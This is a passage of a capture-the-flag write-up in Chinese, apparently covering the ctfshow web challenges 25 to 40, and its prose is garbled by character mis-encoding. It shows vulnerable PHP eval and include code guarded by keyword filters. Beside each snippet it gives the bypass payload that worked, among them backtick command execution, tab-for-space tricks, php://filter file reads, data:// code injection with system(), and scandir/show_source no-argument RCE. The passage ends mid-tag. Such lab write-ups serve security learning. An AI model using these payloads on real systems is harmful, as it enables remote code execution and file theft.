src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/LH_7%246BHAF3_G2K%24SH7_240.png" alt=""><br>ÂæóÂà∞tokenÁöÑÂÄº‰∏∫2504830688</p><blockquote><p>ÊâÄ‰ª•ÂºÄÂßãÊûÑÈÄ†<br>Á¨¨‰∏Ä‰∏™ÔºåÊûÑÈÄ†?r=86715576Ôºå‰ΩøÂæó$rang=0ÔºåÊª°Ë∂≥if((!$rand))ÔºåËøõÂÖ•‰∏ã‰∏ÄÂ±ÇifÂà§Êñ≠tokenÁöÑÂÄº<br>Á¨¨‰∫å‰∏™ÔºåÊûÑÈÄ†cookieÂ§¥ÈáåÁöÑtoken=2504830688</p></blockquote><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/_LWI%60Z57MJJ6T~63%25%28%29F4Z5.png" alt=""><br>ÊàêÂäüÊãøÂà∞flag</p><h3 id="web26"><a class="header-anchor" href="#web26">¬∂</a>web26</h3><p>ÊâìÂºÄÈ°µÈù¢ÔºåÁúãÂà∞‰∏Ä‰∏™ÁΩëÁ´ô<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/1XQD%5DP2%29%60E%24E61~M4R5D%25%5BT.png" alt=""><br>Âè≥ÈîÆÊü•ÁúãÊ∫êÁ†ÅÔºåÂèëÁé∞Â≠òÂú®‰∏Ä‰∏™checkdb.php<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/P%7BD~2I33%245_RB%25ZPCX8%60L%60E.png" alt=""><br>ÁÖßËøô‰∏™Ê†ºÂºèpostÂèëÈÄÅÊï∞ÊçÆÔºåÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/V0HXO4ABATGZ%7DPSLWUN969R.png" alt=""></p><h3 id="web27"><a class="header-anchor" href="#web27">¬∂</a>web27</h3><p>ÊâìÂºÄ‰æùÁÑ∂ÊòØ‰∏Ä‰∏™cms<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/BP6EY%25%258HNQ%25QSL_HNCTKGH.png" alt=""><br>ÁÇπÂáªÂΩïÂèñÂêçÂçïÔºå‰∏ãËΩΩÂæóÂà∞‰∏Ä‰ªΩÂêçÂçï<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/813HRBR%251X85L42%28FAI%298N3.png" alt=""><br>ÂèëÁé∞Ë∫´‰ªΩËØÅ‰∏≠Èó¥Â∞ë‰∫ÜÊó•ÊúüÔºåÁªßÁª≠ÂõûÂà∞È°µÈù¢ÔºåÁÇπÂáªÊü•ËØ¢Á≥ªÁªü<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/AKL~%60%24QE%7DN%28F9E12TH%28IF03.png" alt=""><br>ÈúÄË¶ÅËæìÂÖ•ÂßìÂêçÂíåË∫´‰ªΩËØÅÔºåÊàë‰ª¨Áé∞Âú®Êúâ‰∫ÜÂßìÂêçÔºåË∫´‰ªΩËØÅÊ®°Á≥äÔºåÈÇ£ËøõË°åÊäìÂåÖÁàÜÁ†¥<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/L%7D%28%25%40L7MXJ%40%60L%60ZE6ELV7OC.png" alt=""><br>ËÆæÁΩÆ‰∏Ä‰∏ãÁàÜÁ†¥Ë∫´‰ªΩËØÅ‰∏≠ÁöÑÊó•Êúü<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/3328122SZ%5DDZ1A%283D9T1%290S.png" alt=""><br>ÁàÜÁ†¥ÁªìÊûú<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/9STH6184%7DTQ%60%5DJTBMYXLM%40R.png" alt=""><br>Ëß£Á†Å‰∏Ä‰∏ã<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/J%5D4371%5D%28~B5%29O4%5D%4070%5B%28V%7BH.png" alt=""><br>ÂæóÂà∞Ë∫´‰ªΩËØÅÂè∑ÂíåÂ≠¶Âè∑ÔºåÁÑ∂ÂêéÂéªÈ¶ñÈ°µÁôªÂΩï‰∏Ä‰∏ãÔºåÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/HP%7B%29%24%246%28%29%40%5D80BW%7B%25BRO%5DFC.png" alt=""></p><h3 id="web28"><a class="header-anchor" href="#web28">¬∂</a>web28</h3><p>ÊâìÂºÄÈ°µÈù¢ÔºåÊ≤°ÂèëÁé∞‰ªÄ‰πàÊúâÁî®ÁöÑ‰ø°ÊÅØÔºå‰ΩÜÊòØËßÇÂØüÂà∞urlÊúâ‰∫õÂ•áÊÄ™<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/R%7DN~3OR%24%29AYK3ZR%40KE_%28Z%24Y.png" alt=""><br>Â∫îËØ•ÊòØÁàÜÁ†¥ÁõÆÂΩïÔºåÊäìÂåÖ‰∏Ä‰∏ã<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/L%7BZ%25%5BNXER14_RH%7DI~K7I%40EP.png" alt=""><br>‰∏§‰∏™payloadÈÉΩÈÄâÊã©0Âà∞100ËøõË°åÁàÜÁ†¥<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/F%28_C2B6B%60Q%24%25N~8VF%7BCZ~%258.png" alt=""><br>Âú®ÁàÜÁ†¥ÁªìÊûú‰∏≠ÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/%5D3HMWR%29%7B%60I%60V8~D~987Z5WS.png" alt=""></p><h2 id="ÂëΩ‰ª§ÊâßË°å-29-77-118-122-124"><a class="header-anchor" href="#ÂëΩ‰ª§ÊâßË°å-29-77-118-122-124">¬∂</a>ÂëΩ‰ª§ÊâßË°å(29-77&amp;118-122&amp;124)</h2><h3 id="web29"><a class="header-anchor" href="#web29">¬∂</a>web29</h3><p>Ê∫êÁ†Å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>È¶ñÂÖàÂÖàsystem(‚Äúls‚Äù);Êü•Áúã‰∏Ä‰∏ãÊñá‰ª∂<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/K%24S4PZ%5BAUUD6HI4V3BU%24%5BAW.png" alt=""><br>Êó¢ÁÑ∂ËøáÊª§‰∫ÜflagÔºåÈÇ£Êàë‰ª¨Â∞±fla*ÁöÑÂΩ¢ÂºèËøõË°åÂåπÈÖçÔºåÁªìÂêàtacÂëΩ‰ª§ËæìÂá∫flag.phpÊñá‰ª∂ÂÜÖÂÆπ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/PSF%24%29E%25DF_X2Q5%7DKHS%60%7DEVR.png" alt=""></p><h3 id="web30"><a class="header-anchor" href="#web30">¬∂</a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÊääsystemÂëΩ‰ª§ÁªôËøáÊª§‰∫ÜÔºå‰∏çËøáÊúâÂà´ÁöÑÂßøÂäøÔºå‰æãÂ¶Ç</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac *&#96;;</span><br></pre></td></tr></table></figure><p>ËøòÊòØ‰ΩøÁî®ÈÄöÈÖçÁ¨¶ËøõË°åÂåπÈÖçÔºå‰∏çËøáÊç¢‰∫ÜechoËøõË°åËæìÂá∫<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web30/DY%28YYO%60%7DR_2%293%60MF2J%400A51.png" alt=""></p><h3 id="web31"><a class="header-anchor" href="#web31">¬∂</a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂºÄÂßãËøáÊª§‰∫ÜÁ©∫Ê†ºÔºåÊú¨Êù•ÊàëÊòØ‰ΩøÁî®%20ÁºñÁ†ÅÁªïËøáÁöÑ‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πà‰∏çË°å(ÊúâÁÇπÁñëÊÉë)ÔºåÁÑ∂ÂêéÂ∞±ÊîπÁî®‰∫Ü%09</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;echo%09&#96;tac%09*&#96;;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web31/MPL%7BFEDQ%40VS%28C%5DK%24%60IZPGX3.png" alt=""></p><h3 id="web32"><a class="header-anchor" href="#web32">¬∂</a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÊääÂèçÂºïÂè∑ÂíåechoÈÉΩËøáÊª§‰∫ÜÔºå‰∏çËøáËøòÊúâÊñ∞ÂßøÂäøÔºåÂà©Áî®includeÂáΩÊï∞(ËøòÊúârequire‰πüÂèØ‰ª•)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include$_POST[a]?&gt;</span><br><span class="line"></span><br><span class="line">post:a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web32/Z2ILTYJZF_YO%40_2%28%7BP0GY%5B2.png" alt=""><br>Êääbase64Ëß£Á†ÅÂêéÂç≥ÂèØÂæóÂà∞flag</p><h3 id="web33"><a class="header-anchor" href="#web33">¬∂</a>web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Â§öËøáÊª§‰∫ÜÂèåÂºïÂè∑ÔºåÁªßÁª≠‰ΩøÁî®‰∏ä‰∏ÄÈ¢òÁöÑpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web34"><a class="header-anchor" href="#web34">¬∂</a>web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Â§öËøáÊª§‰∏Ä‰∏™:Âè∑ÔºåËøòÊòØÂèØ‰ª•‰ΩøÁî®‰∏ä‰∏ÄÈ¢òÁöÑpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web35"><a class="header-anchor" href="#web35">¬∂</a>web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Â§öËøáÊª§‰∏Ä‰∏™&lt;Âè∑Âíå‰∏Ä‰∏™=Âè∑Ôºå‰∏çËøáÊ≤°ÊúâÂΩ±ÂìçÔºåÁªßÁª≠‰ΩøÁî®ÂâçÈù¢ÁöÑpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web36"><a class="header-anchor" href="#web36">¬∂</a>web36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Â¢ûÂä†ËøáÊª§Êï∞Â≠óÔºå‰ΩÜËøòÊòØÊ≤°ÊúâÂΩ±ÂìçÔºåÁªßÁª≠‰ΩøÁî®ÂâçÈù¢payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web37"><a class="header-anchor" href="#web37">¬∂</a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Êç¢Êñ∞È¢ò‰∫ÜÔºåËøôÊ¨°ÊòØ‰ΩøÁî®‰∫ÜincludeËØ≠Âè•ÔºåËøôÈáåËøáÊª§‰∫ÜflagÔºåÊàë‰ª¨ÈááÁî®‰º™ÂçèËÆÆdataÁöÑÊñπÊ≥ïËøõË°åÁªïËøá</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web37/%5DJ0%28I6%7BNZRUAD3WLGORLO%604.png" alt=""></p><h3 id="web38"><a class="header-anchor" href="#web38">¬∂</a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Âú®ÂâçÈù¢Âü∫Á°Ä‰∏äËøáÊª§‰∫ÜphpÂíåfileÔºåÂØπÊàë‰ª¨Êó†Á¢çÔºåÂõ†‰∏∫Êàë‰ª¨‰ΩøÁî®ÁöÑÊòØphpÁü≠Ê†áÁ≠æÔºåÊâÄ‰ª•ÁªßÁª≠‰ΩøÁî®‰∏äÈù¢ÁöÑpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web39"><a class="header-anchor" href="#web39">¬∂</a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÂáèÂ∞ë‰∫ÜËøáÊª§Ôºå‰ΩÜÊòØ‰ºöÂÜçÂêéÈù¢Âä†‰∏ä.phpÁöÑÂêéÁºÄÔºåÁÑ∂ËÄåÊàë‰ª¨ÂâçÈù¢ÁöÑpayloadÁªìÂ∞æÊòØÊúâ‰∏Ä‰∏™?&gt;ËøõË°å‰∫ÜÊ†áÁ≠æÈó≠ÂêàÔºåÊâÄ‰ª•?&gt;.phpÊ≤°ÊúâÂΩ±ÂìçÔºåÁªßÁª≠‰ΩøÁî®ÂâçÈù¢payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web40"><a class="header-anchor" href="#web40">¬∂</a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\Ôºà|\Ôºâ|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂõûÂà∞evalËØ≠Âè•ÊâßË°åÂëΩ‰ª§Ôºå‰ΩÜËøáÊª§‰∫ÜËÆ∏Â§ö‰∏úË•øÔºåÊ≤°ÊúâËøáÊª§ÊéâËã±ÊñáÁöÑ()ÔºåÈÇ£Êàë‰ª¨‰ΩøÁî®Êó†ÂèÇÊï∞ÁöÑrceËøõË°åÊûÑÈÄ†ËØªÂèñÊñá‰ª∂</p><blockquote><p>print_r(scandir(‚Äò.‚Äô)); Êü•ÁúãÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂Âêç</p><p>localeconv() ÂáΩÊï∞ËøîÂõû‰∏ÄÂåÖÂê´Êú¨Âú∞Êï∞Â≠óÂèäË¥ßÂ∏ÅÊ†ºÂºè‰ø°ÊÅØÁöÑÊï∞ÁªÑ„ÄÇ</p><p>current() ÂáΩÊï∞ËøîÂõûÊï∞ÁªÑ‰∏≠ÁöÑÂΩìÂâçÂÖÉÁ¥†ÔºàÂçïÂÖÉÔºâ,ÈªòËÆ§ÂèñÁ¨¨‰∏Ä‰∏™ÂÄºÔºåposÊòØcurrentÁöÑÂà´Âêç</p></blockquote><p>Êàë‰ª¨ÂÖàÊâìÂç∞Âá∫ÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/NHDM7A4%5BNQ%5BU3%25S%401W%60%24R2P.png" alt=""><br>ËØªÂèñÁõÆÂΩïÊñá‰ª∂ÂêéÔºåÂèëÁé∞ËæìÂá∫ÁöÑÊòØÊï∞ÁªÑÔºåËÄåÊñá‰ª∂ÂêçÊòØÊï∞ÁªÑ‰∏≠ÁöÑÂÄºÔºå‰∏ã‰∏ÄÊ≠•Êàë‰ª¨ÈúÄË¶ÅÂèñÂá∫ÊÉ≥Ë¶ÅËØªÂèñÊñá‰ª∂ÁöÑÊï∞ÁªÑ</p><blockquote><p>each() ËøîÂõûÊï∞ÁªÑ‰∏≠ÂΩìÂâçÁöÑÈîÆ/ÂÄºÂØπÂπ∂Â∞ÜÊï∞ÁªÑÊåáÈíàÂêëÂâçÁßªÂä®‰∏ÄÊ≠•<br>end() Â∞ÜÊï∞ÁªÑÁöÑÂÜÖÈÉ®ÊåáÈíàÊåáÂêëÊúÄÂêé‰∏Ä‰∏™ÂçïÂÖÉ<br>next() Â∞ÜÊï∞ÁªÑ‰∏≠ÁöÑÂÜÖÈÉ®ÊåáÈíàÂêëÂâçÁßªÂä®‰∏Ä‰Ωç<br>prev() Â∞ÜÊï∞ÁªÑ‰∏≠ÁöÑÂÜÖÈÉ®ÊåáÈíàÂÄíÂõû‰∏Ä‰Ωç<br>array_reverse() ‰ª•Áõ∏ÂèçÁöÑÂÖÉÁ¥†È°∫Â∫èËøîÂõûÊï∞ÁªÑ</p></blockquote><p>ÈúÄË¶ÅÁü•ËØÜÁÇπÈΩê‰∫ÜÔºåËßÇÂØüflag.phpÂú®ÂÄíÊï∞Á¨¨‰∫å‰ΩçÔºåÊàë‰ª¨ÂºÄÂßãÊûÑÈÄ†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure><p><img 